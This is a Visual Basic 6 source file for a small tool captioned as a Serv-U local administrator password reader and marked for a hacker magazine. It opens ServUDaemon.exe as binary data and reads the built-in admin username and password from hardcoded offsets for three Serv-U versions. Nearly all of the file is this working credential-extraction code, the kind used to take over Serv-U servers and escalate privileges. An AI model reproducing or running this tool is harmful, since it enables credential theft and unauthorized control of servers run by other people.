VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Serv-U本地管理帐号密码读取器"
   ClientHeight    =   2115
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   3495
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2115
   ScaleWidth      =   3495
   StartUpPosition =   3  '窗口缺省
   Begin VB.Frame Frame2 
      Caption         =   "AdminPWD"
      Height          =   615
      Left            =   240
      TabIndex        =   2
      Top             =   1200
      Width           =   3015
      Begin VB.TextBox Text2 
         Height          =   270
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   2775
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "AdminName"
      Height          =   615
      Left            =   240
      TabIndex        =   0
      Top             =   480
      Width           =   3015
      Begin VB.TextBox Text1 
         Height          =   270
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   2775
      End
   End
   Begin VB.Label Label1 
      Caption         =   "黑客防线专用"
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   10.5
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   1080
      TabIndex        =   4
      Top             =   120
      Width           =   1335
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim File1 As String   'servudaemon.exe 的所在路径
Dim servu(20)         '定义一个数组来存放serv-u的参数
Dim suver As String
Dim vver              '版本标志的偏移地址(10进制)
Dim suname            '用户名偏移地址(10进制)
Dim supwd             '密码偏移地址(10进制)
Dim vstr As Byte
Dim ustr As Byte
Dim pstr As Byte
Dim vstr2 As String
Dim pstr2 As String   '最后得到的用户名
Dim ustr2 As String   '最后得到的密码
Private Sub Form_Load()
'所支持版本的信息
servu(0) = "5.0.0.9:::2824881:::2992147:::2998464"
 '所支持版本的信息
servu(1) = "5.2.0.1:::2856596:::2990235:::2997363"
'得到所在目录的绝对路径
servu(2) = "5.0.0.11:::2847591:::3031144:::3037461"
Apppath = IIf(Right(App.Path, 1) = "\", Left(App.Path, Len(App.Path) - 1), App.Path)
'servudaemon.exe 的路径
File1 = Apppath & "\" & "ServUDaemon.exe"
'判断'servudaemon.exe是否存在
If LCase(Dir(File1)) = "servudaemon.exe" Then
'遍历 servu 数组
   For Each su In servu
      '为ssu设的错误陷阱,如果su为空的话分割贬值给ssu是会出错
      If su = "" Then
       MsgBox "本软件不支持该版本的Serv-U", , "警告！"
       Exit Sub
      End If
       '分割su
        ssu = Split(su, ":::")
         '把版本标志贬值给suver
        suver = ssu(0)
         '版本标志的偏移地址(10进制)
        vver = Int(ssu(1))
       '用户名偏移地址(10进制)
        suname = Int(ssu(2))
       '密码偏移地址(10进制)
        supwd = Int(ssu(3))
   
      '以2进制方式打开ServUDaemon.exe
      Open File1 For Binary As #2
           vstr2 = ""
         '读取版本标志
          For i = 1 To Len(suver)
              vver = vver + 1
              Get #2, "&H" & Hex(vver), vstr
        '因为读取出来的 vstr 是一个10进制的ascii,所以要用chr函数把他转成字符
              vstr2 = vstr2 & Chr(vstr)
          Next i
        
        '判断版本标志是否与suver相同,如果是就读取帐号和密码
        If suver = vstr2 Then
              ustr2 = ""
              pstr2 = ""
          '读取帐号,一个一个字符的读取,然后把他们串起来
          For i = 1 To 18
              suname = suname + 1
              Get #2, "&H" & Hex(suname), ustr
             '因为读取出来的 ustr 是一个10进制的ascii,所以要用chr函数把他转成字符
              ustr2 = ustr2 & Chr(ustr)
          Next i
        
         '读取密码,一个一个字符的读取,然后把他们串起来
          For i = 1 To 14
              supwd = supwd + 1
              Get #2, "&H" & Hex(supwd), pstr
               '因为读取出来的 pstr 是一个10进制的ascii,所以要用chr函数把他转成字符
              pstr2 = pstr2 & Chr(pstr)
          Next
 
              Text1.Text = ustr2
              Text2.Text = pstr2
              Close #2
           Exit Sub
        End If
 
      Close #2
   Next
   
Else
        MsgBox "找不到ServUDaemon.exe文件", , "警告！"
        Exit Sub
End If
End Sub

